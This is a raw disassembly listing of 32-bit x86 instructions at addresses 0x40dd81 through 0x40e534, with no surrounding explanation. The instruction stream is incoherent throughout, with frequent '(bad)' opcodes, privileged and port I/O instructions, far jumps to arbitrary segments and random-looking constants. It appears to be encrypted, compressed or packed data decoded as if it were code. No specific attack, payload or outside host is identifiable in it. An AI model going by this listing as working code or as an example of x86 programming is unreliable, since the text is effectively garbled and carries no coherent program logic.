  40dd81:	shr    DWORD PTR [ebp-0x3f],cl
  40dd84:	mov    esp,0x8a34b346
  40dd89:	je     0x40dd49
  40dd8b:	cmp    edi,esi
  40dd8d:	fsub   DWORD PTR [ecx+0x7e]
  40dd90:	mov    BYTE PTR [ebp+0x1490d4c6],bl
  40dd96:	xchg   eax,ecx
  40dd98:	xor    eax,0x42a4c94d
  40dd9d:	popa   
  40dd9e:	je     0x40dd36
  40dda0:	psrld  mm7,QWORD PTR [ebx+0x726dac4]
  40dda7:	cmc    
  40dda8:	into   
  40dda9:	popa   
  40ddaa:	mov    ecx,eax
  40ddac:	cdq    
  40ddad:	lods   al,BYTE PTR ds:[esi]
  40ddae:	pop    es
  40ddaf:	push   edi
  40ddb0:	inc    ebx
  40ddb1:	add    eax,DWORD PTR [eax-0x5660ed50]
  40ddb7:	adc    esi,DWORD PTR [esi]
  40ddb9:	pop    ss
  40ddba:	xchg   DWORD PTR [esi+0x1b],edx
  40ddbd:	js     0x40de23
  40ddbf:	test   BYTE PTR [eax-0x78804ce1],dl
  40ddc5:	test   BYTE PTR [ecx],ch
  40ddc7:	mov    esi,0x75cd6303
  40ddcc:	pop    eax
  40ddcd:	jg     0x40de42
  40ddcf:	mov    edi,0xab8f0c8a
  40ddd4:	(bad)  
  40ddd5:	inc    ebp
  40ddd6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ddd7:	add    BYTE PTR [ebx+0x1fc501a3],0x6b
  40ddde:	es jbe 0x40dd70
  40dde1:	or     BYTE PTR [ebp-0x8],bh
  40dde4:	add    al,0x6c
  40dde6:	aaa    
  40dde7:	or     eax,0x98924c2b
  40ddec:	enter  0x6981,0x45
  40ddf0:	popa   
  40ddf1:	cmp    WORD PTR [esi-0xe],dx
  40ddf5:	push   ecx
  40ddf6:	push   0x92abe2c4
  40ddfb:	sbb    ecx,0xd12168aa
  40de01:	fst    QWORD PTR [eax-0x1847576f]
  40de07:	mov    esp,0x1b9c647d
  40de0c:	push   edi
  40de0d:	pop    ecx
  40de0e:	push   ebx
  40de0f:	xorps  xmm4,XMMWORD PTR [esi+0x5ea4d683]
  40de16:	scas   eax,DWORD PTR es:[edi]
  40de17:	jp     0x40ddde
  40de19:	aaa    
  40de1a:	pushf  
  40de1b:	adc    esi,DWORD PTR [edi-0x335ad1]
  40de21:	add    ebp,0xc9b073dd
  40de27:	and    esi,esp
  40de29:	out    dx,al
  40de2a:	inc    eax
  40de2b:	repnz cld 
  40de2d:	popf   
  40de2e:	iret   
  40de2f:	or     ebp,DWORD PTR ds:0x7529c59f
  40de35:	leave  
  40de36:	push   ss
  40de37:	stos   BYTE PTR es:[edi],al
  40de38:	push   cs
  40de39:	push   ds
  40de3a:	or     BYTE PTR [ecx],dl
  40de3c:	push   ebx
  40de3d:	fisttp DWORD PTR [edx+0x76]
  40de40:	jnp    0x40ddf7
  40de42:	push   esp
  40de43:	das    
  40de44:	pop    ebx
  40de45:	imul   edx,ecx,0xc6a50564
  40de4b:	out    dx,al
  40de4c:	sbb    dl,bh
  40de4e:	dec    esp
  40de4f:	sub    eax,0xd64b4b5d
  40de54:	sbb    bl,BYTE PTR [ecx+0x4a589354]
  40de5a:	cmp    BYTE PTR [ecx-0x67],ch
  40de5d:	aad    0xd
  40de5f:	push   esp
  40de60:	sbb    DWORD PTR [eax+ebp*4],esp
  40de63:	aam    0xdc
  40de65:	push   ebx
  40de66:	push   eax
  40de67:	xor    dl,BYTE PTR [edx-0x2]
  40de6a:	rcr    DWORD PTR [ebx+eax*4-0x51],0x87
  40de6f:	mov    esp,0xd4bcf322
  40de74:	xchg   edx,eax
  40de75:	adc    eax,0xa74e9df6
  40de7a:	mov    al,0x65
  40de7c:	(bad)  
  40de7e:	int3   
  40de7f:	sbb    BYTE PTR [ebx+0x12],0xce
  40de83:	shl    esi,1
  40de85:	loopne 0x40de0f
  40de87:	aas    
  40de88:	sbb    bl,BYTE PTR [edi-0x748c9fc0]
  40de8e:	or     eax,0x1d5fb4f6
  40de93:	retf   0x5257
  40de96:	pop    ebx
  40de97:	stos   BYTE PTR es:[edi],al
  40de98:	ins    DWORD PTR es:[edi],dx
  40de99:	dec    ebx
  40de9a:	xchg   ecx,eax
  40de9b:	out    dx,eax
  40de9c:	(bad)  [eax-0x49fca426]
  40dea2:	sbb    DWORD PTR [esi-0x7c],0x9a4f19bb
  40dea9:	jge    0x40df12
  40deab:	mov    al,0x81
  40dead:	mov    al,ds:0x60e7456e
  40deb3:	or     ah,BYTE PTR [eax]
  40deb5:	ret    0xdd41
  40deb8:	mov    al,ds:0x9204acd8
  40debd:	mov    bh,0xd6
  40debf:	les    edi,FWORD PTR ds:[edi+0x2d]
  40dec3:	cld    
  40dec4:	repnz mov WORD PTR [edi-0x4e],fs
  40dec8:	hlt    
  40dec9:	mov    eax,ds:0xa544d0ea
  40dece:	iret   
  40decf:	adc    bl,dl
  40ded1:	sub    al,0xb3
  40ded3:	mov    DWORD PTR [ecx+0x18],0x9aca1e48
  40deda:	stos   DWORD PTR es:[edi],eax
  40dedb:	jnp    0x40deb8
  40dedd:	jns    0x40de78
  40dedf:	xchg   esi,eax
  40dee0:	sbb    ebp,ecx
  40dee2:	imul   eax,ebp,0x5f
  40dee5:	daa    
  40dee6:	mov    ch,0xe2
  40dee8:	ret    
  40dee9:	cmp    dh,BYTE PTR ss:[edx]
  40deec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40deed:	loopne 0x40de8e
  40deef:	popa   
  40def0:	mov    edi,0x73cdba29
  40def5:	test   BYTE PTR [ebp-0x1c],al
  40def8:	mul    BYTE PTR [ebp-0x31]
  40defb:	xor    DWORD PTR [ebp-0x53e974b8],0xf72db735
  40df05:	adc    ebp,eax
  40df07:	sbb    DWORD PTR [edx+0x68baf9f7],esi
  40df0d:	out    0xf1,al
  40df0f:	loope  0x40df50
  40df11:	lock or al,0xfa
  40df14:	test   al,0xb8
  40df16:	sbb    BYTE PTR [edx+esi*2-0x3e],dl
  40df1a:	lods   al,BYTE PTR ds:[esi]
  40df1b:	and    al,0x44
  40df1d:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40df1f:	inc    ebp
  40df20:	xchg   dl,bh
  40df22:	iret   
  40df23:	imul   edx,DWORD PTR [esi+0x208739e7],0x10
  40df2a:	cmp    BYTE PTR [edi],bh
  40df2c:	or     DWORD PTR [esi],esi
  40df2e:	clc    
  40df2f:	mov    al,ds:0x134d590e
  40df34:	inc    edx
  40df35:	mov    BYTE PTR [ebx],bh
  40df37:	fmul   DWORD PTR [eax]
  40df39:	jg     0x40df39
  40df3b:	mov    eax,ds:0x166244d5
  40df40:	adc    al,0x63
  40df42:	ss in  al,dx
  40df44:	dec    esp
  40df45:	out    0xb6,al
  40df47:	adc    DWORD PTR [esi+ebp*4-0x70],edi
  40df4b:	shr    BYTE PTR [esi-0x782aac98],cl
  40df51:	jge    0x40dfc8
  40df53:	(bad)  [ecx-0x39]
  40df56:	pop    ecx
  40df57:	retf   
  40df58:	ds jne 0x40df42
  40df5b:	fld    QWORD PTR [ebx+ebx*2+0x60500ff4]
  40df62:	aad    0x23
  40df64:	dec    edi
  40df65:	outs   dx,DWORD PTR ds:[esi]
  40df66:	jae    0x40df02
  40df68:	or     cx,WORD PTR [edi+0x2abd201f]
  40df6f:	les    esp,FWORD PTR [ebx]
  40df71:	loope  0x40df3e
  40df73:	in     al,0x6b
  40df75:	inc    edi
  40df76:	mov    eax,0x3fded42e
  40df7b:	jb     0x40df55
  40df7d:	retf   0x98a7
  40df80:	retf   
  40df81:	mov    bl,0xa4
  40df83:	push   ebx
  40df84:	dec    edx
  40df85:	aad    0x15
  40df87:	xchg   dh,ch
  40df89:	lds    ebx,FWORD PTR [ecx+0x1]
  40df8c:	push   esi
  40df8d:	mov    al,ds:0xfc47d4f7
  40df92:	aam    0x41
  40df94:	mov    bl,0x2c
  40df96:	outs   dx,BYTE PTR ds:[esi]
  40df97:	inc    esi
  40df98:	mov    ds:0xc472d1fe,al
  40df9d:	mov    ecx,0x9c9c0d8c
  40dfa2:	adc    BYTE PTR [edi+0x1dcd1ae9],0x8e
  40dfa9:	mov    ah,0x5e
  40dfab:	ins    DWORD PTR es:[edi],dx
  40dfac:	int3   
  40dfad:	xchg   edx,eax
  40dfae:	jge    0x40df6a
  40dfb0:	fldenv [eax+0x41fd7928]
  40dfb6:	lock pop eax
  40dfb8:	sub    al,0x52
  40dfba:	add    esp,DWORD PTR [edi-0x69]
  40dfbd:	or     BYTE PTR [ebx],bh
  40dfbf:	adc    BYTE PTR [edi+ebx*1],al
  40dfc2:	or     BYTE PTR [edi-0x7cc977d1],0x2b
  40dfc9:	jns    0x40dfde
  40dfcb:	jne    0x40df77
  40dfcd:	or     BYTE PTR [esi+0x36ab9272],0x3e
  40dfd4:	xchg   esp,eax
  40dfd5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dfd6:	inc    ecx
  40dfd7:	xor    DWORD PTR [edi-0x67e1711c],ecx
  40dfdd:	push   ecx
  40dfde:	push   0x1e
  40dfe0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dfe1:	ins    DWORD PTR es:[edi],dx
  40dfe2:	nop
  40dfe3:	(bad)  
  40dfe5:	sub    al,0xbe
  40dfe7:	xchg   edi,eax
  40dfe8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dfe9:	dec    edx
  40dfea:	adc    BYTE PTR [bp+0x66],ch
  40dfee:	sahf   
  40dfef:	inc    esp
  40dff0:	or     DWORD PTR [edi-0x2f],ebx
  40dff3:	push   ebp
  40dff4:	les    ebx,FWORD PTR [esi]
  40dff6:	aad    0x83
  40dff8:	outs   dx,BYTE PTR ds:[esi]
  40dff9:	jo     0x40e047
  40dffb:	add    esi,esp
  40dffd:	xchg   esp,eax
  40dffe:	pop    esp
  40dfff:	ss adc dh,ch
  40e002:	in     al,dx
  40e003:	je     0x40e055
  40e005:	dec    eax
  40e006:	cmp    DWORD PTR [ebx*8+0x101f1e0c],ebx
  40e00d:	pop    ss
  40e00e:	adc    eax,0xbbad6f26
  40e013:	cmp    al,0x31
  40e015:	lods   eax,DWORD PTR ds:[esi]
  40e016:	xlat   BYTE PTR ds:[ebx]
  40e017:	adc    BYTE PTR [ecx],bh
  40e019:	mov    bh,0x1c
  40e01b:	dec    edx
  40e01c:	fdiv   st(4),st
  40e01e:	xchg   ecx,eax
  40e01f:	clc    
  40e020:	sub    bl,dl
  40e022:	mov    ebp,0x2acb6b3f
  40e027:	lods   eax,DWORD PTR ds:[esi]
  40e028:	inc    ebp
  40e029:	and    eax,0x1ad0c21
  40e02e:	lar    di,WORD PTR [esi-0x78f8238f]
  40e036:	test   DWORD PTR [eax+0x6f],edi
  40e039:	ds mov edi,0xd29f4305
  40e03f:	pop    ds
  40e040:	lidtd  [edx+0x4dcb07bc]
  40e047:	leave  
  40e048:	sti    
  40e049:	add    eax,ebx
  40e04b:	inc    edi
  40e04c:	add    BYTE PTR [ebp-0x6d2674f3],bh
  40e052:	fimul  WORD PTR [edi]
  40e054:	mov    cl,0xe6
  40e056:	fimul  DWORD PTR [ecx-0x9c55628]
  40e05c:	mov    ah,0xd2
  40e05e:	push   edx
  40e05f:	xchg   edx,eax
  40e060:	test   DWORD PTR [edx-0x206151c1],0x742e3dc0
  40e06a:	test   al,0x7d
  40e06c:	fist   DWORD PTR [edi-0x7d34b230]
  40e072:	rcl    bl,1
  40e074:	add    dl,BYTE PTR [ecx-0x574f5897]
  40e07a:	adc    eax,0xdcbe18c7
  40e07f:	adc    BYTE PTR [edx-0x7fc5edfb],0xfd
  40e086:	retf   
  40e087:	in     eax,dx
  40e088:	mov    al,0x1e
  40e08a:	mov    BYTE PTR [esi],ch
  40e08c:	mov    bh,0x8c
  40e08e:	test   BYTE PTR [ebx-0x1f],dh
  40e091:	jnp    0x40e0e2
  40e093:	call   0x7db496f4
  40e098:	shl    BYTE PTR [esp+esi*4-0x1fb537a9],0xe7
  40e0a0:	das    
  40e0a1:	nop
  40e0a2:	jle    0x40e074
  40e0a4:	popa   
  40e0a5:	aas    
  40e0a6:	adc    al,0xd3
  40e0a8:	sbb    DWORD PTR [ebx-0x79c06a0b],eax
  40e0ae:	bound  ebp,QWORD PTR [ebx]
  40e0b0:	(bad)  
  40e0b1:	or     BYTE PTR [esi+0x19],ah
  40e0b4:	push   cs
  40e0b5:	adc    eax,0xbc7113b9
  40e0ba:	test   bh,al
  40e0bc:	loope  0x40e138
  40e0be:	aam    0x47
  40e0c0:	sub    BYTE PTR [ecx+0x54f446f2],bh
  40e0c6:	imul   ecx,esp,0x5d8ffb10
  40e0cc:	dec    ecx
  40e0cd:	or     al,0x5c
  40e0cf:	cmp    al,0x13
  40e0d1:	int3   
  40e0d2:	push   0xf9c5cf5d
  40e0d7:	jp     0x40e079
  40e0d9:	(bad)  
  40e0da:	jle    0x40e13f
  40e0dc:	clc    
  40e0dd:	inc    esp
  40e0de:	and    esi,esi
  40e0e0:	mov    ds:0x2652fdd5,al
  40e0e5:	mov    ?,WORD PTR [esi+0x4e0860eb]
  40e0eb:	test   DWORD PTR [esi+0x4e],0x3d215bd0
  40e0f2:	mov    edi,0xb383b7cd
  40e0f7:	and    cl,BYTE PTR [ecx-0x7271d5eb]
  40e0fd:	jg     0x40e131
  40e0ff:	jae    0x40e084
  40e101:	xchg   esi,eax
  40e102:	and    ecx,DWORD PTR [ebx-0x2550045]
  40e108:	mov    edi,0x4cc43235
  40e10d:	out    dx,eax
  40e10e:	xor    DWORD PTR [ebp*4-0x2799133d],edx
  40e115:	daa    
  40e116:	loope  0x40e0dd
  40e118:	cs dec esp
  40e11a:	cwde   
  40e11b:	xchg   ecx,eax
  40e11c:	xchg   esi,ecx
  40e11e:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e120:	ins    BYTE PTR es:[edi],dx
  40e121:	xchg   BYTE PTR [esp+ecx*8-0x514e597],bl
  40e128:	pop    ebp
  40e129:	in     eax,dx
  40e12a:	xor    eax,0x333cc75f
  40e12f:	mov    eax,ds:0xa625c695
  40e134:	lahf   
  40e135:	dec    eax
  40e136:	inc    esp
  40e137:	cmp    dl,BYTE PTR [esi]
  40e139:	push   ebx
  40e13a:	jb     0x40e158
  40e13c:	jmp    0xe21e:0x53a391be
  40e143:	adc    DWORD PTR [edi+0x69a82d49],esp
  40e149:	leave  
  40e14a:	pop    ds
  40e14b:	sti    
  40e14c:	stos   DWORD PTR es:[edi],eax
  40e14d:	add    esp,ebx
  40e14f:	jbe    0x40e109
  40e151:	xchg   esp,eax
  40e152:	adc    ebp,edx
  40e154:	fdivr  st,st(4)
  40e156:	xor    BYTE PTR [eax+0x5cc0d08b],bh
  40e15c:	mul    BYTE PTR ds:0x5ab20996
  40e162:	push   esi
  40e163:	cmc    
  40e164:	inc    esi
  40e165:	xor    DWORD PTR [esp+eiz*8-0x4a],edx
  40e169:	fnstsw WORD PTR [edi-0xa]
  40e16c:	jno    0x40e150
  40e16e:	push   es
  40e16f:	add    DWORD PTR [ebx-0x40e9d6f9],edx
  40e175:	push   ecx
  40e176:	call   0x2a5a0e3f
  40e17b:	aam    0xb4
  40e17d:	add    BYTE PTR [ecx-0x2640124b],dl
  40e183:	int    0x57
  40e185:	enter  0x55e1,0xd
  40e189:	jne    0x40e192
  40e18b:	jl     0x40e1ab
  40e18d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e18e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e18f:	pop    ebp
  40e190:	push   0xffffffd8
  40e192:	dec    esi
  40e193:	dec    ecx
  40e194:	add    al,ch
  40e196:	loopne 0x40e1b3
  40e198:	shl    al,cl
  40e19a:	xor    cl,al
  40e19c:	pop    ecx
  40e19d:	cmp    DWORD PTR [edx-0x35f2569f],ebp
  40e1a3:	cmp    BYTE PTR [ebp+0x34b6099e],al
  40e1a9:	pop    esi
  40e1aa:	jle    0x40e1d9
  40e1ac:	popf   
  40e1ad:	xchg   BYTE PTR [edx+0x6b22b18c],bl
  40e1b3:	in     al,0xc5
  40e1b5:	jge    0x40e222
  40e1b7:	aas    
  40e1b8:	cwde   
  40e1b9:	add    ebx,edx
  40e1bb:	and    eax,ebx
  40e1bd:	lea    esi,[ebp-0x6d7bba74]
  40e1c3:	loope  0x40e204
  40e1c5:	add    BYTE PTR ds:0x4da763cd,dl
  40e1cb:	jl     0x40e1ac
  40e1cd:	cmp    eax,0x9a63840c
  40e1d2:	test   eax,0xf39036a2
  40e1d7:	mov    edx,0x286d6176
  40e1dc:	mov    ch,dh
  40e1de:	inc    eax
  40e1df:	jecxz  0x40e216
  40e1e1:	add    DWORD PTR [ecx+eiz*1],ecx
  40e1e4:	mov    al,ds:0xbebf1526
  40e1e9:	lock ins BYTE PTR es:[edi],dx
  40e1eb:	pop    ebx
  40e1ec:	out    dx,eax
  40e1ed:	(bad)  
  40e1ee:	out    0xf3,eax
  40e1f0:	xor    al,0xa3
  40e1f2:	hlt    
  40e1f3:	add    edi,DWORD PTR [ebp-0x21ce0de9]
  40e1f9:	or     cl,BYTE PTR [esi]
  40e1fb:	cmp    eax,ebp
  40e1fd:	sbb    bl,al
  40e1ff:	hlt    
  40e200:	and    eax,0xe7b884d3
  40e205:	shl    BYTE PTR [edx+0x39],0x84
  40e209:	inc    ebx
  40e20a:	mov    BYTE PTR [eax-0x59ec0ccd],cl
  40e210:	xlat   BYTE PTR ds:[ebx]
  40e211:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e212:	iret   
  40e213:	add    esi,edx
  40e215:	popf   
  40e216:	jno    0x40e242
  40e218:	ja     0x40e1c0
  40e21a:	pop    esp
  40e21b:	pop    ds
  40e21c:	xor    esp,DWORD PTR [ebp+0x708ce9c6]
  40e222:	arpl   WORD PTR [bp+si],cx
  40e225:	sbb    DWORD PTR [esi+0x75],ebx
  40e228:	loop   0x40e249
  40e22a:	cld    
  40e22b:	or     al,0x2d
  40e22d:	pop    ss
  40e22e:	fiadd  WORD PTR [ebx+0x4849e1]
  40e234:	add    BYTE PTR [eax-0x50d49bc5],ch
  40e23a:	cs mov bl,0x9e
  40e23d:	add    eax,0x690e5c21
  40e242:	sbb    al,ch
  40e244:	adc    BYTE PTR [ebx],dh
  40e246:	in     eax,dx
  40e247:	out    0x55,al
  40e249:	outs   dx,BYTE PTR ds:[esi]
  40e24a:	jo     0x40e204
  40e24c:	dec    eax
  40e24d:	leave  
  40e24e:	repnz out dx,al
  40e250:	jno    0x40e289
  40e252:	adc    ah,BYTE PTR [edx+0x2a]
  40e255:	push   es
  40e256:	sub    al,0x61
  40e258:	pop    esi
  40e259:	and    DWORD PTR [edi-0x298834ca],ebp
  40e25f:	(bad)  
  40e260:	in     eax,dx
  40e261:	jno    0x40e241
  40e263:	add    bl,BYTE PTR [ebp-0x70]
  40e266:	lods   al,BYTE PTR ds:[esi]
  40e267:	stos   DWORD PTR es:[edi],eax
  40e268:	inc    eax
  40e269:	pop    ebp
  40e26b:	jne    0x40e1f7
  40e26d:	dec    esp
  40e26e:	dec    eax
  40e26f:	xchg   dl,cl
  40e271:	out    0xd,al
  40e273:	pop    es
  40e274:	xchg   DWORD PTR [ecx],edx
  40e276:	adc    al,0x8d
  40e278:	je     0x40e28b
  40e27a:	adc    BYTE PTR [edi+0x2],bl
  40e27d:	mov    esi,0xd31302f4
  40e282:	cwde   
  40e283:	popa   
  40e284:	cmp    DWORD PTR [ecx+ebp*2-0x55],ecx
  40e288:	jg     0x40e2d1
  40e28a:	inc    esp
  40e28b:	cmp    eax,edi
  40e28d:	ins    BYTE PTR es:[edi],dx
  40e28e:	cmc    
  40e28f:	lods   al,BYTE PTR ds:[esi]
  40e290:	or     eax,0x363ee858
  40e295:	push   ebp
  40e296:	jb     0x40e30e
  40e298:	xchg   BYTE PTR [ebx],bh
  40e29a:	ss pop es
  40e29c:	and    cl,BYTE PTR [edi+0x67]
  40e29f:	rcl    DWORD PTR [esi+0x6021b45c],1
  40e2a5:	cwde   
  40e2a6:	test   al,0xdd
  40e2a8:	das    
  40e2a9:	fsubr  QWORD PTR [ebx-0x43]
  40e2ac:	sbb    ch,ch
  40e2ae:	popa   
  40e2af:	and    BYTE PTR [ecx+0x0],dh
  40e2b2:	fwait
  40e2b3:	jge    0x40e2c9
  40e2b5:	int3   
  40e2b6:	cmc    
  40e2b7:	mov    ds:0x960fd6fe,al
  40e2bc:	mov    ebp,eax
  40e2be:	ja     0x40e275
  40e2c0:	imul   ecx,eax,0x38
  40e2c3:	pushf  
  40e2c4:	jno    0x40e276
  40e2c6:	dec    esi
  40e2c7:	xor    BYTE PTR [edx-0x74b7f816],ah
  40e2cd:	js     0x40e2b8
  40e2cf:	pop    es
  40e2d0:	ds in  al,0x4d
  40e2d3:	popf   
  40e2d4:	les    eax,FWORD PTR [ebp-0x148656b9]
  40e2da:	xor    ch,bl
  40e2dc:	mov    ds:0x68b9dc5e,eax
  40e2e1:	pushf  
  40e2e2:	out    dx,eax
  40e2e3:	iret   
  40e2e4:	fiadd  WORD PTR [esi]
  40e2e6:	enter  0x2ebb,0x24
  40e2ea:	call   0x20896637
  40e2ef:	xor    ebx,DWORD PTR ds:[ebx+ebp*1-0x2df53d41]
  40e2f7:	popf   
  40e2f8:	dec    edx
  40e2f9:	xchg   edi,eax
  40e2fa:	xor    al,BYTE PTR [ebx+esi*8-0x7f35e11b]
  40e301:	mov    al,0xb5
  40e303:	cmp    bl,cl
  40e305:	mov    ?,WORD PTR [edi-0x42]
  40e308:	in     al,0xf0
  40e30a:	xor    al,0x73
  40e30c:	test   BYTE PTR [esi+0x35137f83],ah
  40e312:	adc    al,0x52
  40e314:	aas    
  40e315:	(bad)  
  40e316:	fstp   TBYTE PTR ds:0x1dee581f
  40e31c:	lods   eax,DWORD PTR ds:[esi]
  40e31d:	cmp    al,0x28
  40e31f:	popa   
  40e320:	test   DWORD PTR [ebp+0x35223178],ebx
  40e326:	jp     0x40e35f
  40e328:	gs ja  0x40e2fd
  40e32b:	and    bl,ah
  40e32d:	xor    esi,eax
  40e32f:	clc    
  40e330:	add    DWORD PTR [esi+0x731d2fb7],0xffffff82
  40e337:	xor    al,0xf8
  40e339:	aam    0xda
  40e33b:	test   DWORD PTR [ebp-0xad5f0b6],edi
  40e341:	and    ebx,0x6d
  40e344:	clc    
  40e345:	xchg   bx,ax
  40e347:	mov    edi,0x28fc5fd1
  40e34c:	xor    eax,0xba2e2f75
  40e351:	shr    DWORD PTR [edx+0x22c6a165],cl
  40e357:	xchg   edx,eax
  40e358:	scas   al,BYTE PTR es:[edi]
  40e359:	ss ins DWORD PTR es:[edi],dx
  40e35b:	dec    ebx
  40e35c:	jmp    0x40e36a
  40e35e:	inc    eax
  40e35f:	xchg   edi,eax
  40e360:	mov    esi,esp
  40e362:	mov    edi,0x3a65e7aa
  40e367:	stos   BYTE PTR es:[edi],al
  40e368:	mov    bl,ah
  40e36a:	mov    WORD PTR [ecx-0x67304f79],?
  40e370:	pop    edi
  40e371:	pop    esp
  40e372:	add    BYTE PTR [ebx-0x6e],al
  40e375:	and    eax,0xe6c41c2b
  40e37a:	clc    
  40e37b:	into   
  40e37c:	or     eax,0x9e9e1f13
  40e381:	cmp    bl,BYTE PTR [edx-0x35831191]
  40e387:	xchg   edx,eax
  40e388:	outs   dx,BYTE PTR ds:[esi]
  40e389:	mov    eax,0xe58c1f9a
  40e38e:	loope  0x40e3bc
  40e390:	add    edi,edi
  40e392:	sbb    dh,bl
  40e394:	lods   eax,DWORD PTR ds:[esi]
  40e395:	inc    ebx
  40e396:	imul   ebp,esp,0x419dd2c4
  40e39c:	dec    eax
  40e39d:	mov    edi,0x5e33c949
  40e3a2:	int3   
  40e3a3:	pop    esi
  40e3a4:	add    al,0x8c
  40e3a6:	pop    edx
  40e3a7:	xor    al,cl
  40e3a9:	pushf  
  40e3aa:	js     0x40e331
  40e3ac:	imul   edi,DWORD PTR ds:0xb3a060d3,0x18
  40e3b3:	mov    eax,ds:0x293bd2c9
  40e3b8:	test   DWORD PTR [eax-0x1f],eax
  40e3bb:	inc    edx
  40e3bc:	sbb    BYTE PTR [esi-0x2],cl
  40e3bf:	rol    BYTE PTR [ebx],cl
  40e3c1:	pop    ebx
  40e3c2:	jb     0x40e3be
  40e3c4:	es or  eax,0x41153ca3
  40e3ca:	mov    ch,BYTE PTR [esi-0x1d]
  40e3cd:	ds mov cl,0x2c
  40e3d0:	jl     0x40e39c
  40e3d2:	sub    BYTE PTR [eax+0x1c2a5faf],al
  40e3d8:	imul   esp,DWORD PTR [ebp-0x21],0x28367d88
  40e3df:	sub    BYTE PTR [ecx+0x39954855],bh
  40e3e5:	(bad)  
  40e3e6:	sti    
  40e3e7:	sbb    al,0xe5
  40e3e9:	jmp    0x5414:0xa84852a5
  40e3f0:	mov    al,0xab
  40e3f2:	aaa    
  40e3f3:	loope  0x40e37d
  40e3f5:	stos   DWORD PTR es:[edi],eax
  40e3f6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e3f7:	lea    eax,ds:0x1b041966
  40e3fd:	scas   al,BYTE PTR es:[edi]
  40e3fe:	mov    DWORD PTR [eax+eiz*8],0x66676941
  40e405:	add    DWORD PTR [ebp+edi*1-0x72],0xc92dd8d4
  40e40d:	jnp    0x40e3c9
  40e40f:	mov    ecx,0x4902a100
  40e414:	retf   0x9a23
  40e417:	cwde   
  40e418:	pop    ebp
  40e419:	sub    al,0x5b
  40e41b:	mov    ds:0xd4ec816,al
  40e420:	mov    al,0x3c
  40e422:	push   es
  40e423:	adc    BYTE PTR [esp+edi*1],bh
  40e426:	inc    ecx
  40e427:	inc    edi
  40e428:	repnz ror BYTE PTR [ebx],0xc5
  40e42c:	xlat   BYTE PTR ds:[ebx]
  40e42d:	adc    esp,DWORD PTR ds:0x754e7872
  40e433:	addr16 aad 0x1b
  40e436:	push   0x379c8a69
  40e43b:	lea    esp,[esi]
  40e43d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e43e:	mov    eax,0x55467241
  40e443:	stos   DWORD PTR es:[edi],eax
  40e444:	cmp    cl,BYTE PTR [edi+0x5cb099f3]
  40e44a:	je     0x40e430
  40e44c:	mov    esp,DWORD PTR [ebp+ecx*1-0x7a]
  40e450:	mov    ecx,0xff4a3d20
  40e455:	or     dl,dl
  40e457:	data16 cmp ah,BYTE PTR [edi+eax*4]
  40e45b:	mov    DWORD PTR [esi+0x55eb5fd],edx
  40e461:	nop
  40e462:	adc    ecx,DWORD PTR [eax+0x42]
  40e465:	sbb    esi,DWORD PTR [esi]
  40e467:	outs   dx,BYTE PTR ds:[esi]
  40e468:	addr16 jg 0x40e4bf
  40e46b:	xor    al,0x2b
  40e46d:	or     BYTE PTR [ebp+0x1395ffc7],ah
  40e473:	adc    al,BYTE PTR [edi+0xb99249a]
  40e479:	fcomp  QWORD PTR [ebx+0x29]
  40e47c:	push   0xe8ad30db
  40e481:	adc    al,0xe9
  40e483:	dec    esp
  40e484:	enter  0x4475,0xb2
  40e488:	xor    DWORD PTR [esi+0x36],edx
  40e48b:	inc    DWORD PTR [esp+ebx*2+0x21665da6]
  40e492:	push   ss
  40e493:	js     0x40e443
  40e495:	ret    0x21be
  40e498:	int    0x87
  40e49a:	fisttp QWORD PTR [ebp-0x69]
  40e49d:	sbb    BYTE PTR [edx+ebx*2+0x42],al
  40e4a1:	dec    ecx
  40e4a2:	cmp    BYTE PTR [ecx-0x26],al
  40e4a5:	mov    BYTE PTR [eax],cl
  40e4a7:	jmp    0x3c53:0x958548f8
  40e4ae:	or     bl,BYTE PTR [eax+0x1a]
  40e4b1:	mov    ds:0xabecc97b,eax
  40e4b6:	(bad)  
  40e4b7:	loope  0x40e4db
  40e4b9:	pop    ebx
  40e4ba:	sub    al,0xb8
  40e4bc:	nop
  40e4bd:	js     0x40e512
  40e4bf:	jns    0x40e47b
  40e4c1:	nop
  40e4c2:	push   0x319b9394
  40e4c7:	lods   eax,DWORD PTR ds:[esi]
  40e4c8:	cmp    al,0xcc
  40e4ca:	int3   
  40e4cb:	call   0x85c210fd
  40e4d0:	fild   WORD PTR es:[eax+ebx*8]
  40e4d4:	xchg   ebx,eax
  40e4d5:	fidiv  WORD PTR [ebx+0x60cd8539]
  40e4db:	pop    edx
  40e4dc:	jg     0x40e491
  40e4de:	adc    BYTE PTR [ebx-0x1b529363],cl
  40e4e4:	repnz pop edx
  40e4e6:	inc    edi
  40e4e7:	jecxz  0x40e566
  40e4e9:	mov    esi,0x78d9ae8b
  40e4ee:	(bad)  
  40e4ef:	out    dx,al
  40e4f0:	dec    ebp
  40e4f1:	add    al,0x1c
  40e4f3:	icebp  
  40e4f4:	fbld   TBYTE PTR [esi]
  40e4f6:	stos   BYTE PTR es:[edi],al
  40e4f7:	out    dx,al
  40e4f8:	inc    esi
  40e4f9:	fidivr WORD PTR [edi]
  40e4fb:	mov    DWORD PTR [ebx-0x47ec2e2d],ecx
  40e501:	(bad)  
  40e502:	and    bl,ah
  40e504:	or     eax,0xa7a3043e
  40e509:	les    ecx,FWORD PTR [esi+0x370b0c01]
  40e50f:	retf   0xc067
  40e512:	enter  0xe7bf,0xf3
  40e516:	lds    esi,FWORD PTR [ebx+0x29]
  40e519:	imul   edi,DWORD PTR [edi],0xffffffa6
  40e51c:	push   edi
  40e51d:	idiv   DWORD PTR ds:0x11f06dd3
  40e523:	int    0x13
  40e525:	aad    0xd
  40e527:	bound  ebp,QWORD PTR [ebx+0x26531d10]
  40e52d:	loop   0x40e586
  40e52f:	mov    ebp,0xe1e690b4
  40e534:	adc    BYTE PTR [ebx],dl
